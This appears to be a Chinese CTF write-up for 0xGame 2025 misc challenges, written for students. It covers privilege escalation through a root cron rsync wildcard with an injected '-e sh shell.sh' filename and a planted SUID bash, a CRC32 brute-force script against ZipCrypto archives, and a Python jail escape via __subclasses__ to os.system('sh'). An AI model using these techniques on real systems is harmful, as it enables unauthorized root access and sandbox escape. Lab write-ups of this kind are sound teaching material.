第一步，我们先看看定时任务，Linux 中，常见定时任务的文件配置路径是/etc/cron.d，然后我们需要使用`ls -la`检测，有没有可以读内容的 root 定时任务（这里就是 root 用户对于定时任务权限的配置不当，低权限用户利用 root 启动的定时任务，完全可以实现提权，下面几个文件，会发现，我们对于三个定时任务都可读，因为`-rw-r--r--`

```bash
ctf@dep-1f31e3dc-af66-4648-afb6-1b7bad80dc22-69cd6d55bf-trqhl:~$ ls -la /etc/cron.d
total 20
drwxr-xr-x 1 root root 4096 Oct  8 14:08 .
drwxr-xr-x 1 root root 4096 Oct  8 14:08 ..
-rw-r--r-- 1 root root  102 Mar  2  2023 .placeholder
-rw-r--r-- 1 root root  122 Oct  8 13:08 ctf_backup_job
-rw-r--r-- 1 root root  201 Jun  6 17:12 e2scrub_all
ctf@dep-1f31e3dc-af66-4648-afb6-1b7bad80dc22-69cd6d55bf-trqhl:~$ cat /etc/cron.d/ctf_backup_job
* * * * * root /bin/sh -c "cd /home/ctf && rsync -t *.txt 0xGame:/tmp/backup/"
# congratulations!,this is key to be king!
```

读取/etc/cron.d/ctf_backup_job，发现它是每一分钟都会执行一次的 rsync 同步文件命令，然后最最重要的点是，它是 root 下的定时任务

`rsync -t *.txt 0xGame:/tmp/backup/`读取路径下所有 txt 文件的内容，并同步到远程主机的/tmp/backup/路径下，-t 是带上时间戳

这里我给出的提权方式是命令劫持，先使用 rsync --help 分析所有功能

<img src="/img/0xgame2025/image-20251016203959362.png" alt="image-20251016203959362" style="zoom:50%;" />

关注这里，意思是说 rsync 允许我们指定一个程序进行远程连接主机，这里的 COMMAND 可以是 bash 命令，也可以是一个脚本文件，研究了这么久的 Linux，大家应该有所体会，创建一个文件名是不可能出现'/'这样的特殊符号的,但是我们完全可以指定 shell 脚本文件（虽说 rsync 本意是为了让我们用脚本辅助远程连接，但是不管有没有远程连接成功，这个脚本都会被 root 执行，这也就给我们提权机会了

```bash
echo -e '#!/bin/bash\ncp /bin/bash /home/ctf/rootbash\nchmod u+s /home/ctf/rootbash' > shell.sh
```

用命令行创建文件的方式很多，但是有的时候，系统没有提供 nano,vim,vi 等文本编辑工具，我们就需要用其他命令代替，比如说 echo,printf,cat 等等。

我这里使用 echo 命令，然后写了个可以复制/etc/bash 的命令，再加了个 suid 权限，这么多内容，显然不能直接写入，我指定了-e，可以执行一些特定命令，比如\n 换行等等

<img src="/img/0xgame2025/image-20251016211023397.png" alt="image-20251016211023397" style="zoom:50%;" />

最后效果如上

> **拓展**
>
> 温馨提示，#!/bin/bash 这一行可以省略，但是还是建议保留
>
> 这个被叫做`Shebang` ，如果我们不指定 sh 也可以执行，直接./shell.sh 就好了，但是！！！一定要提前`chmod +x shell.sh`，给它加个执行权限，这里大家了解学习

然后这里不一定要写我这样的命令，有简单的，直接 ls /root/确定 flag.txt，然后 cat /root/flag.txt；也有难的，直接将当前用户拉进 root 权限组，或者说编辑/etc/sudoers 文件，让当前用户可以无密码执行 sudo 等等

然后是关键部分（不管上面你们用的什么版本提权，都必须经过这一步

```bash
touch -- '-e sh shell.sh    .txt'
```

touch 是 Linux 创建文件的命令，--是选项终止符（就是说不解析后面文件名里的-e）不然我们根本创建不了这样的文件，sh 是调用了/bin/sh，用来执行 shell.sh 里面的内容

等待片刻，会发现当前路径出现了 rootbash

```bash
ctf@dep-1cf51ecf-457b-422d-823d-9c8104b746b6-5ffc77b68c-rff4g:~$ ls -la
total 1272
-rw-r--r-- 1 ctf  ctf        0 Oct 16 13:02 '-e sh shell.sh    .txt'
drwxr-xr-x 1 ctf  ctf     4096 Oct 16 13:04  .
drwxr-xr-x 1 root root    4096 Oct  8 13:29  ..
-rw------- 1 ctf  ctf       84 Oct 16 13:10  .bash_history
-rw-r--r-- 1 ctf  ctf      220 Jun  6 14:38  .bash_logout
-rw-r--r-- 1 ctf  ctf     3526 Jun  6 14:38  .bashrc
-rw-r--r-- 1 ctf  ctf      807 Jun  6 14:38  .profile
-rw-r--r-- 1 ctf  ctf       56 Oct  8 14:08  hello.txt
-rwsr-xr-x 1 root root 1265648 Oct 16 13:13  rootbash
-rw-r--r-- 1 ctf  ctf       73 Oct 16 13:03  shell.sh
```

值得高兴，rootbash 是 root 权限文件，而且还给了 suid 位

接下来我们要是直接./rootbash 的话，会发现失败，我们并没有拿到 root 权限，这是因为现代 Linux 系统中的 **Bash Shell** 包含了一个**安全机制**，当它检测到自己是以 **SUID/SGID** 权限运行时，**会故意降级权限，避免被用于提权攻击。**

然后我们可以通过`./rootbash -p`指定 bash 要保留有效用户 id（因为是 root 创建的，自然就是 root 的 id

```bash
ctf@dep-1cf51ecf-457b-422d-823d-9c8104b746b6-5ffc77b68c-rff4g:~$ ./rootbash -p
rootbash-5.2# id
uid=1000(ctf) gid=1000(ctf) euid=0(root) groups=1000(ctf)
rootbash-5.2# whoami
root
rootbash-5.2# ls /root
flag.txt
rootbash-5.2# cat /root/flag.txt
0xGame{Game_over_you_@re_gonna_Be_the_champ_of_CTFers!!!}
```

请看，当前我们虽说还是 ctf 的用户，但是 euid 是 root 的，然后 whoami 回复的是当前 shell 的用户名（可以理解成执行./rootbash 会调用一个新的 shell

##### 一些 Q&A

###### 为什么 `uid` 还是 `ctf`？



- **UID (User ID)**：**实际用户 ID**。这就像我们的**真实身份证**。无论我们做什么，发起这个操作的真实身份始终是 `ctf` (`uid=1000`)。
- **结论：** 我们的登录身份没有改变，仍然是从 `ctf` 用户的会话中发起的操作。



###### 2. 什么是 `euid`？—— 权限的临时“工牌”



- **EUID (Effective User ID)**：**有效用户 ID**。这才是系统进行**权限检查**时所依据的身份。可以把 EUID 理解为我们的**临时“工牌”或“通行证”**。
- **SUID 机制的工作原理：**
  - 当一个带有 SUID 权限（所有者是 `root`）的程序被执行时，Linux 内核会把执行者的 **EUID** **临时修改**成该文件的**所有者**的 UID。
  - 在我们的例子中，`./rootbash` 的所有者是 `root (0)`，所以当 `ctf` 用户运行它时，**EUID 临时变成了 `0(root)`**。
- **结论：** 你虽然还是 `ctf` 本人（UID），但你现在佩戴了一张 “Root 权限” 的工牌（EUID），系统允许你执行 Root 才能进行的操作（如 `cat /root/flag.txt`）。



###### 3. `whoami` 为什么显示 `root`？

执行**`./rootbash -p` 本质上调用了一个新的 Shell**。

- 当你在 SUID Shell 中运行 `whoami` 命令时，它并不是回复你的登录用户名，而是去查询**当前执行它的这个进程的 EUID** 对应的用户名。
- 因为这个 SUID Shell 的 EUID 是 `root`，所以它理所当然地回答：“我是 `root`”

> 渗透真的很重视实战，学长建议对这方面感兴趣的学弟学妹要多在靶机网站打，积累足够多的经验，这对后面打护网、安全研究、安全稳固等等实操中帮助很大很大

### 开锁师傅 2.0

> 本题考察了 CRC32 爆破攻击（原理角度

这有两个重要概念需要清楚（来自 Gemini 老师

**CRC32 是什么？**

- **全称**：Cyclic Redundancy Check，循环冗余校验。
- **用途**：它是一种**数据完整性校验**算法，而不是加密算法。它的主要目的是检查数据在传输或存储过程中是否发生了意外的损坏或改变。
- **原理**：它会根据文件的二进制内容，通过一套固定的数学运算，生成一个 32 位的整数值（即 CRC32 校验码）。你可以把它想象成是文件的一个非常简单的“指纹”。如果文件的任何一个比特（bit）发生了改变，那么重新计算出的 CRC32 值有极大的概率会不同。
- **关键特性**：计算速度非常快。

**ZIP 压缩包的结构**

- 一个 ZIP 包里可以包含多个文件。对于每个文件，ZIP 格式都会存储两部分信息：
  - **文件数据（File Data）**：这是文件本身的内容，经过压缩和加密。
  - **文件元数据（Metadata/Header）**：这是描述文件信息的数据，比如文件名、原始大小、压缩后的大小，以及最重要的——**原始文件（未加密前）的 CRC32 校验码**。
- **致命缺陷**：在使用传统的 ZipCrypto 加密时，**文件数据本身是被加密的，但包含 CRC32 值的这部分元数据却是以明文形式存储的，没有被加密**。

---

回到这一部分讲解的 crc32 爆破攻击，它有局限性，这种攻击主要针对的是`ZipCrypto`算法，然后文件的未压缩大小都应该足够小，最好是 6 字节以下

关注的是这一部分，用 bandzip 或其他 zip 解压工具也能看到，基本上都叫做**原始大小**

<img src="/img/0xgame2025/image-20251016215834680.png" alt="image-20251016215834680" style="zoom:50%;" />

仔细关注的话，会发现我压缩包里面出现小文件的大小稍微有点随机，有 1 字节和 3 字节，还有两个其他文件

#### crc32 爆破攻击原理

简单说说这个攻击方法的原理，由于压缩包里面的文件内容很小很小，那么完全可以通过爆破的方式，通过生成所有可能的 3 字节（看未压缩大小）文件，然后和压缩包里的 crc32 值进行匹配，要是成功了，就可以拿它当作已知明文进行明文攻击，获取 flag，到这一步就很轻松了

然后简单说下我的解密脚本逻辑，当未压缩大小在 4 字节之内的话，那就直接**明文穷举爆破**即可 。然后大小超过 4 字节时，需要使用[专门的数学工具](https://github.com/theonlypwner/crc32/blob/main/crc32.py)进行 crc 反转攻击，原理涉及密码学，zip 加密原理等等（太复杂，没学会，就直接引用 theonlypwner 大佬的工具，然后我再在他的工具基础上，拓展了自行搜集 crc，自行检测密码是否正确的小功能

理论上，单纯使用 crc 反转攻击几乎可以实现所有小字节的爆破攻击，但是我这里依然选择保留 4 字节以下的明文穷举爆破过程，因为那位大佬的工具内置的字符集里面不包含中文字符或别的特殊字符

> 有点疑惑，为啥之前见到的 crc32 爆破，都理所当然的认为小文件里面就放着压缩包密码？这次移动线下交流赛里面，那个《天书》题目就被我之前研究过的脚本一把梭了，它的考点是将一个 png 图片按照 1 个字节存储 1 个文件，里面很多很多文件，通过我的脚本，一把梭，将完整的 png 给爆破出来，拿到 POA(这个比赛里的 flag)

#### how to solve

我给出的参考脚本，我从我之前写的项目中截取部分弄出来的，还是有点冗余，但是放出来，大家可以存一份，蛮适用 crc 爆破攻击的，如果爆破长度超过 4 字节，需要大家去将上面给的大佬写的数学工具下载下来，放到同一目录下就可以了

```python
import zipfile
import argparse
import itertools
import subprocess
import re
import zlib
import os
from tqdm import tqdm


def bytes_to_hex_or_str(content: bytes) -> str:
    """
    将字节串转换为可读的字符串或十六进制字符串。
    如果能解码为可打印的 UTF-8 字符串（包括中文），则返回该字符串；
    否则（即二进制源码信息或控制字符），返回其十六进制表示。
    """
    try:
        # 1. 尝试使用 UTF-8 解码
        decoded_str = content.decode('utf-8')

        if decoded_str.isprintable():
             return f"'{decoded_str}'"
        else:
             # 3. 如果包含控制字符，视为二进制/源码信息，转为十六进制
             return content.hex()
             
    except UnicodeDecodeError:
        # 4. 解码失败（纯二进制数据），直接转为十六进制
        return content.hex()
        
    except Exception:
        # 5. 其他异常 (安全起见)
        return content.hex()

def extract_targets(zip_filename: str) -> list:
    """分析 ZIP 文件，提取所有加密文件信息。"""
    targets = []
    print(f"[*] 正在分析压缩包: {zip_filename}")
    try:
        with zipfile.ZipFile(zip_filename, 'r') as zf:
            for info in zf.infolist():
                # 检查是否加密 (flag_bits & 0x1) 且非空
                if info.flag_bits & 0x1 and info.file_size > 0:
                    targets.append({
                        "filename": info.filename, "size": info.file_size, "crc": info.CRC
                    })

        def sort_key(target):
            # 尝试按文件名中的数字排序，如果没有数字则放后面
            match = re.search(r'(\d+)', target['filename'])
            if match:
                return (int(match.group(1)), target['filename'])
            return (float('inf'), target['filename'])

        targets.sort(key=sort_key)
        print(f"[+] 发现 {len(targets)} 个加密文件。")
    except (FileNotFoundError, zipfile.BadZipFile) as e:
        print(f"[!] 错误: {e}")
    return targets

def brute_force_many_short_files(targets: list):
    """高效批量爆破 <= 3 位元組的文件。"""
    if not targets: return {}, {}
    print(f"[*] 檢測到 {len(targets)} 个小文件 (<=3 字節)，準備进行高效批量爆破...")
    size_groups = {}
    for t in targets:
        size = t['size']
        if size not in size_groups: size_groups[size] = []
        size_groups[size].append(t)

    crc_to_plaintext = {}
    for length, group_targets in size_groups.items():
        print(f"  [-] 开始对 {len(group_targets)} 个大小为 {length} 字节的文件进行爆破...")
        group_crc_map = {t['crc']: t['filename'] for t in group_targets}
        # tqdm 的 total 应该为 256**length
        pbar = tqdm(itertools.product(range(256), repeat=length), total=256**length, desc=f"    -> {length}字节爆破", unit="B", leave=False)
        found_count = 0
        for byte_tuple in pbar:
            plaintext_bytes = bytes(byte_tuple)
            crc_val = zlib.crc32(plaintext_bytes) & 0xFFFFFFFF
            if crc_val in group_crc_map and crc_val not in crc_to_plaintext:
                crc_to_plaintext[crc_val] = plaintext_bytes
                found_count += 1
                pbar.set_postfix_str(f"已找到 {found_count}/{len(group_crc_map)} 个")
            if found_count == len(group_crc_map):
                pbar.update(pbar.total - pbar.n) # 加速进度条完成
                break
        pbar.close()

    crc_map = {}
    for t in targets:
        if t['crc'] not in crc_map: crc_map[t['crc']] = []
        crc_map[t['crc']].append(t['filename'])

    return crc_map, crc_to_plaintext

def reverse_crc_long(targets: list, crc_tool_path: str) -> dict:
    """对 4-7 位元組的文件進行 CRC 反轉。"""
    if not targets: return {}
    print(f"[*] 檢測到 {len(targets)} 個中等大小文件 (4-7 字節)，準備進行 CRC 反轉...")
    fragments_map = {}
    for target in targets:
        filename = target['filename']
        print(f"  [-] 正在调用外部工具为 '{filename}' (大小: {target['size']} B, CRC: {hex(target['crc'])}) 进行反转...")
        # 确保使用 python3 调用
        command = ["python3", crc_tool_path, "reverse", hex(target['crc'])]
        try:
            # 增加 timeout 避免卡死
            proc = subprocess.run(command, capture_output=True, text=True, check=True, encoding='utf-8', errors='ignore', timeout=300)
            # 修正正则，匹配可能的十六进制输出或字符串输出
            fragments = re.findall(r"(?:alternative|bytes|hex):\s+(.+?)\s+\(OK\)", proc.stdout)
            
            processed_fragments = []
            for frag in fragments:
                frag = frag.strip().strip("'\"") # 清理引号
                # 尝试将碎片转换为 bytes（如果是十六进制）
                if len(frag) % 2 == 0 and all(c in '0123456789abcdefABCDEF' for c in frag):
                    try:
                        processed_fragments.append(bytes.fromhex(frag))
                    except ValueError:
                        processed_fragments.append(frag)
                else:
                    # 假定为 ASCII/UTF-8 字符串
                    processed_fragments.append(frag)
            
            if processed_fragments:
                # 只保留唯一的结果，并保持原始顺序
                unique_fragments = []
                for frag in processed_fragments:
                    if frag not in unique_fragments:
                        unique_fragments.append(frag)
                fragments_map[filename] = unique_fragments
                
        except subprocess.TimeoutExpired:
            print(f"\n[!] 调用 '{crc_tool_path}' 超时。")
        except Exception as e:
            print(f"\n[!] 调用 '{crc_tool_path}' 失败: {e}")
            
    return fragments_map

def test_password(zip_filename: str, password_bytes: bytes, test_file: str) -> bool:
    try:
        with zipfile.ZipFile(zip_filename, 'r') as zf:
            zf.read(test_file, pwd=password_bytes)
        return True
    except Exception:
        return False


def main():
    parser = argparse.ArgumentParser(description="终极完美版 CRC 攻击脚本 V12 (已移除 bkcrack KPA)。")
    parser.add_argument("zip_file", help="需要破解的 ZIP 文件路径。")
    parser.add_argument("--tool", type=str, default="crc32.py", help="可用的 crc32.py 工具路径。")
    args = parser.parse_args()

    all_targets = extract_targets(args.zip_file)
    if not all_targets: return

    short_targets = [t for t in all_targets if t['size'] <= 3]
    medium_targets = [t for t in all_targets if 4 <= t['size'] <= 7]
    large_targets = [t for t in all_targets if t['size'] >= 8]

    print(f"\n[*] 文件分析完成，分组如下:")
    print(f"  - {len(short_targets)} 个小文件 (<=3 字节) -> 将使用二进制爆破")
    print(f"  - {len(medium_targets)} 个中等文件 (4-7 字节) -> 将使用 CRC 反转")
    print(f"  - {len(large_targets)} 个大文件 (>=8 字节) -> 将被忽略")
    print("-" * 50)

    final_results = {} # {filename: [content1, content2, ...]}
    
    if short_targets:
        crc_map, crc_to_plaintext = brute_force_many_short_files(short_targets)
        for crc, plaintext in crc_to_plaintext.items():
            for fname in crc_map.get(crc, []):
                final_results[fname] = [plaintext]

    if medium_targets:
        fragments_map = reverse_crc_long(medium_targets, args.tool)
        for fname, frags in fragments_map.items():
            final_results[fname] = frags

    if not final_results:
        print("\n[!] 未能破解或恢复任何文件内容。")
        return

    print("\n" + "="*50); print("🎉 [+] 初步破解/恢复完成！结果如下："); print("="*50)
    ordered_cracked_filenames = [t['filename'] for t in all_targets if t['filename'] in final_results]

    decoded_parts_for_summary = []
    for filename in ordered_cracked_filenames:
        content_list = final_results[filename]
        display_parts = []
        summary_part = "" # 用于拼接的第一个结果

        for i, content in enumerate(content_list):
            if isinstance(content, bytes):
                # 使用优化后的函数处理 bytes 类型
                display_str = bytes_to_hex_or_str(content)
                summary_part = display_str.strip("'")
                display_parts.append(display_str)
            else:
                # CRC 反转工具输出的字符串
                display_parts.append(f"'{content}'")
                summary_part = content
                    
        decoded_parts_for_summary.append(summary_part)
        print(f"  -> 文件 '{filename}': [{', '.join(display_parts)}]")

    print("\n[*] 以上所有结果的**首个**可能性拼接后的内容为:")
    full_decoded_text = "".join(decoded_parts_for_summary)
    print(f"    拼接内容: {full_decoded_text}")

    try:
        choice = input("\n[?] 是否要继续尝试自动攻击（密码组合）？(y/n): ")
    except KeyboardInterrupt:
        print("\n操作已取消。"); return
    if choice.lower() != 'y':
        print("[*] 操作结束。"); return

    if medium_targets:
        print("\n--- 尝试将 CRC 反转结果组合成密码 ---")
        password_fragment_lists = [final_results[t['filename']] for t in medium_targets if t['filename'] in final_results]
        
        cleaned_password_fragment_lists = []
        for frag_list in password_fragment_lists:

             cleaned_frag_list = [f.decode('utf-8', errors='ignore') if isinstance(f, bytes) else f for f in frag_list]
             cleaned_password_fragment_lists.append(list(set(f for f in cleaned_frag_list if f)))
             
        if any(cleaned_password_fragment_lists):
            test_file = max(all_targets, key=lambda t: t['size'])['filename']
            print(f"[*] 自动选择最大文件 '{test_file}' 用于密码验证。")
            
            total_passwords = 1
            for frags in cleaned_password_fragment_lists: total_passwords *= len(frags)
            
            pbar = tqdm(itertools.product(*cleaned_password_fragment_lists), total=total_passwords, desc="  -> 尝试密码", unit="Combo")
            for combo in pbar:
                password_str = "".join(combo)
                password_bytes = password_str.encode('utf-8')
                
                display_pwd = password_str[:30] + '...' if len(password_str) > 30 else password_str
                pbar.set_postfix_str(f"正在尝试: '{display_pwd}'")
                
                if test_password(args.zip_file, password_bytes, test_file):
                    pbar.close()
                    print("\n" + "="*50); print(f"🎉 [+] 最终密码验证成功！"); print(f"  >>>  {password_str}  <<<"); print("="*50)
                    return
            print("\n[!] 未能自动验证出正确的密码组合。")
        else:
             print("[*] 没有可用的 CRC 反转结果用于密码组合。")


if __name__ == "__main__":
    main()
    
"""
olo@yolo:~/Desktop/timu/0xGame/开锁师傅$ python crcdecrypt.py attachment.zip
[*] 正在分析压缩包: attachment.zip
[+] 发现 40 个加密文件。

[*] 文件分析完成，分组如下:
  - 38 个小文件 (<=3 字节) -> 将使用二进制爆破
  - 0 个中等文件 (4-7 字节) -> 将使用 CRC 反转
  - 2 个大文件 (>=8 字节) -> 将被忽略
--------------------------------------------------
[*] 檢測到 38 个小文件 (<=3 字節)，準備进行高效批量爆破...
  [-] 开始对 19 个大小为 3 字节的文件进行爆破...
  [-] 开始对 19 个大小为 1 字节的文件进行爆破...

==================================================
🎉 [+] 初步破解/恢复完成！结果如下：
==================================================
  -> 文件 '1.txt': ['好']
  -> 文件 '2.txt': ['像']
......省略部分......
  -> 文件 '34.txt': ['x']
  -> 文件 '35.txt': ['G']
  -> 文件 '36.txt': ['a']
  -> 文件 '37.txt': ['m']
  -> 文件 '38.txt': ['e']

[*] 以上所有结果的**首个**可能性拼接后的内容为:
    拼接内容: 好像有个很重要的文件,就记住了前面的内容:welcome_to_0xGame

[?] 是否要继续尝试自动攻击（密码组合）？(y/n): y
yolo@yolo:~/Desktop/timu/0xGame/开锁师傅$
"""
```

进行 bkcrack -L 或者 bandzip 分析的时候，会注意到压缩包里面有个 VIP_file，接下来我就使用这个文件考察了明文攻击，week2 解决了，应该都掌握了吧，不会的，回到 week2 再学

> 这里就留个截图好了

<img src="/img/0xgame2025/image-20251016222641099.png" alt="image-20251016222641099" style="zoom:50%;" />

### Jail 大逃亡

> 打了 moe 的 Jail3，突发奇想，想读取 main.py，发现这里的权限是完全不可读的，不过看看进程，就有了法子🤭

#### pass pyjail

先审计 jail

```python
def jail():
    while True:
        player_input=input("Please input your code here: ")
        try:
            result=eval(player_input,{"__builtins__":None},{})
            print("Code have been executed")
            if result is not None:
                print(f"Return value: {result}")

        except Exception as e:
            print(f"Execution error: {type(e).__name__}: {e}")
```

会发现将所有内置函数（如 print,open,exec,eval 等）清空，并在第三个参数中传入一个空字典作为全局命名空间，从而限制了可执行的代码

这类显然是打继承链了，核心思路是：

- **找到一个可以利用的对象：** 在当前受限的环境中，寻找一个能够访问其类的对象。通常这个对象会是一个内置类型（如字符串、列表、元组等）或一个函数。

- **获取该对象的类（`__class__`）：** 利用 `.__class__` 属性获取该对象的类型。

- **获取基类（`__base__` 或 `__bases__`）：** 通过类的 `.__base__` (单个基类) 或 `.__bases__` (所有基类组成的元组) 属性，向上追溯继承链，直到找到最顶层的基类 `object`。

- **查找子类（`__subclasses__`）：** 一旦获得 `object` 类，就可以调用它的 `__subclasses__()` 方法，获得当前 Python 进程中**所有已加载的类**的列表。

- **找到一个包含危险功能（如执行命令）的类：** 在 `__subclasses__()` 返回的列表中，寻找一个有用的类，例如：

- - `warnings.catch_warnings`
- - `subprocess.Popen`
- - `os._wrap_close`

<img src="/img/0xgame2025/image-20251016233110992.png" alt="image-20251016233110992" style="zoom:50%;" />

简单举例，你看，从基本的字符串向上追溯，显示获取字符串的类：`str`，然后获取基类：`object`，再向上直接可以获取所有子类：`subclasses`

这里主要是和 python 的结构有关系，这里不做详细解释，需要大家前往 python 官方文档学学（不学也可以，记住有这样的结构就好了，然后给出我的 payload

```bash
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("sh")
```

这个 payload 很优雅吧

<img src="/img/0xgame2025/1c81477683494d3d1a16c1bbb8946077.jpg" alt="1c81477683494d3d1a16c1bbb8946077" style="zoom:50%;" />

#### payload 详细解剖

- `''`,这是一个空字符串对象（可以看作我上面举例中用到的字符串对象'abc'，这是我们打继承链的起点
- `.__class__`获取了空字符串的类，结果是`<class 'str'>`
- `.__base__`获取 str 类的基类，结果是`<class 'object'>`,这里很关键，因为 object 类下的`__subclasses__`方法中有很多很多我们能用到的方法

接下来我使用了列表推导式查找到我们可以利用的方法

- `for x in ......subclasswd......`，这里遍历了所有的类(x)
- `if x.__name__=="_wrap_class"`,这里只保留了类名为`_wrap_close`的类，这个类在 python 中通常是`os._wrap_close`
- `x.__init__.globals__`,这里对于我们筛选出来的类`(os._wrap_close)`获取其初始化方法`__init__`的全局命名空间，里面有一个关键的方法名 system，熟悉 python 执行 shell 命令的，一定见过 os.system()吧，就是这个意思
- 我们使用那个列表推导式拿到的类里面，正常来说只有 os._wrap_close，所以用[0]索引就好了，将它 init 初始化得到全局字典里面有我们需要的方法名 system，然后调用执行系统命令，最后通过 sh 命令，就能拿到 shell，沙箱逃逸成功

#### pass root_privileges

绕过 python jail，拿到 shell 后，发现有个文件的内容让我们想办法读取 main.py，但是当前我们是 nobody 这样的最低权限，不能读取，接下来的操作算是一个小型提权处理

<img src="/img/0xgame2025/image-20251017154754089.png" alt="image-20251017154754089" style="zoom:50%;" />

```bash
~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.3  0.0  20612 15248 ?        Ss   08:10   0:00 python3 main.py
nobody         7  0.2  0.0  20600 14820 ?        S    08:10   0:00 python3 /proc/self/fd/4 fork
nobody         8  0.0  0.0   2584   932 ?        S    08:10   0:00 sh -c sh
nobody         9  0.0  0.0   2584   956 ?        S    08:10   0:00 sh
nobody        10  0.0  0.0   8484  4208 ?        R    08:11   0:00 ps aux
~$ ls -la /proc/self/fd/4
lrwx------ 1 nobody root 64 Oct 17 08:11 /proc/self/fd/4 -> /memfd:/app/main.py (deleted)

```

注意看，这里由于配置不当，让 nobodyfork 了 main.py，这里考察的知识点是通过文件描述符 fd，读取对应的文件

相关原理推荐[这篇文章](https://www.anquanke.com/post/id/241148)

> moectf 上面，jail3 的出题师傅为了实现过验证和保护 main.py，将这个 py 进程给 fork 传递到其他地方了，但是他那边失误了一点，就是他让父进程使用了 `pass_fds=[self_fd]`，导致低权限的子进程**继承**了 FD 4 这个**已打开的文件句柄**。如果说他加了个中间脚本，就是说 fork 的内容是执行一个脚本，这个脚本再执行 main.py，有点难度，但是我也有法子解决，那就是用`os.write()`覆盖 fd 的文件内容，总之我目前的解决方案是取消父进程 fork，不过这样的话，就没考察的意义了呢，有点点小为难……有了，那里的`os.memfd_create()`改成`os.pipe()`,这样的 fd 描述符仅仅可读，然后呢，我再挂个中间文件，完美！

<img src="/img/0xgame2025/image-20251017161331048.png" alt="image-20251017161331048" style="zoom:50%;" />

然后怎么读取呢？这里 fork 的权限给了我们 nobody，但是直接读的话，会由于链接文件直接读取那个/app/main.py 了

请注意，这里我们 fork 是从 root 用户执行文件后 fork 的，换言之，root 已经帮我们打开，并执行了程序，我们就完全可以接着 read 了，然后 read 的文件应该是`/proc/7/fd/4`!!!

> 一些补充，在 Linux 中，对某些文件进行操作都是先 open 然后 read,比方说 Linux 的 cat 就是先 open 文件，再输出的，这里的 open 过程就是检查权限的一个过程
>
> 我觉得我这里的举例很好
>
> 一个文件的操作分为打开，读取，操作，关闭，就比方说一个袋子用 root 先打开，然后在打开的状态下给 nobody，接下来 nobody 就绕过了打开的操作，这里的打开操作就是那个检查权限的过程

然后在本环境中，推荐用 python 的封装语句

```bash
python -c "import os;os.lseek(4,0,0);print(os.read(4,90000).decode('latin1',errors='ignore'))"
```

#### 简单解释

- **`import os`：** 导入 `os` 模块，以便使用底层文件操作函数。

- **`os.lseek(4, 0, 0)`：** 将 FD 4 的读取指针**重置**到文件的开头（偏移量 0，从文件开头开始）。这是必要的，因为子进程在执行 Python 脚本时，读取指针很可能已经移到了文件末尾。

- **`os.read(4, 90000)`：** 从文件描述符 4 中读取最多 90000 字节的数据。(90000 我随便写的，肯定越多越能保证提取完整啊)

- **`.decode(...)`：** 将读取到的字节流解码为字符串并打印出来。

#### get flag

执行后读取到了 main.py，拿到了 flag_hint 函数，

```python
def flag_hint():
    print("there are some important information for you")
    key='49a635cd124174a4b3e0d4c02b6224ddfaabc5e2640600cc195e29f21075dd93'
    IV='MEOHeAiC+BlLhH3FKhl0MQ=='
    Ciphertext='j+W4sfLJL4wN0rX2Qi03wqDXDb37DNtYjeYoBVIeKOt4WSUb/Sx4B8/8O4ZXA4J9'
    print("that's all,have fun!!!")


```

很基础的 CBC 加密 aes，我看 Sean 在 week2 给你们出过，不管是写脚本还是在线工具，都很好解决

```python
import base64
import binascii
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt_cbc_data(key_hex,iv_b64,ciphertext_b64):
        try:
                key=bytes.fromhex(key_hex)
                iv=base64.b64decode(iv_b64)
                ciphertext=base64.b64decode(ciphertext_b64)

                if len(key) not in [16,24,32]:
                        raise ValueError(f"wrong length:{len(key)}")

                if len(iv) != 16:
                        raise ValueError(f"wrong length:{len(iv)}")

                cipher=AES.new(key,AES.MODE_CBC,iv)
                plaintext=cipher.decrypt(ciphertext)

                plaintext=unpad(plaintext,AES.block_size)
                return plaintext.decode('utf-8')

        except Exception as e:
                raise Exception(f"worng:{str(e)}")

key='49a635cd124174a4b3e0d4c02b6224ddfaabc5e2640600cc195e29f21075dd93'
IV='MEOHeAiC+BlLhH3FKhl0MQ=='
Ciphertext='j+W4sfLJL4wN0rX2Qi03wqDXDb37DNtYjeYoBVIeKOt4WSUb/Sx4B8/8O4ZXA4J9'


try:
        result=decrypt_cbc_data(key,IV,Ciphertext)
        print("sussessful!!!")
        print("result:",result)
except Exception as e:
        print("wrong:",str(e))
     
"""
sussessful!!!
result: 0xGame{Contratulations!You_solved_pyjail!}
"""
```

### 大而美

> 这个人出的题，我不太想讲，需要的问他



---

### To be continues

Okey,看到这里，也就意味着整个 0xGame2025 结束咯，结合我给出的授课 pdf，大家应该收获了不少吧，下面是一些结束语……



to 老赛棍：

​	这是我第一次出题，难度上确实没把握住，难了不少吧（已经简化了呢，而且考察比较偏向原理、实战）

​	是不是对你们来说，这次 misc 比较陌生？因为以往的五花八门的隐写，我不太喜欢，有些要对出题人脑洞，有些指定了某些妙妙小工具，至少在我看来，这种题就算解决了，成就感也不是很高，哈哈，并没有否定其他出题师傅的意思，每个人都有自己的出题风格吧，但是大家的目标都一样，通过一次又一次比赛，学习新的技能，为学弟学妹们更轻松入门 ctf 提供帮助。在后续的比赛中，愿和大家共勉，大家都是学习安全的，在追求更高更新的技术的路上，我们是对手也是同路人，顶峰见！

---

to 学弟学妹们（校内外都算哦）：

​	本次新生赛结束了，大家有没有体会到什么是网络安全呢？有没有体验到自己想象中的 hacker 生活呢？哈哈，是不是感觉被骗了（我当初也是这样想的）但是！！！这才是真正黑客要经历的道路，网上的那种戴面具的黑客才大骗子呢，超级圈钱大骗子

​	如果你们认真从 week1 打到了 week4，我可以负责任的说，你们都已经入门 ctf 比赛（我们今年 0x 真的蛮有难度的，所以那些感觉分数较低的学弟学妹不要气馁，能坚持下来，你们已经甩了同届同学一大圈了（包括少数老登呢，我去年真的很菜很菜

​	在你们后面的学习生活中，希望你们脚踏实地，遇到一个知识点，抽点时间钻研一二，那种工具题的话，可以简单看看 wp，了解下就 ok 了，对了，给你们推荐一篇[文章](https://goodlunatic.github.io/posts/1ad9200/)，博客作者是 Lunatic，我当初是看他的视频一步一步学习的，他真的好厉害，这篇文章是他为 misc 入门的新手们写的，你们解题遇到了没见过的考点，可以参考他的文章

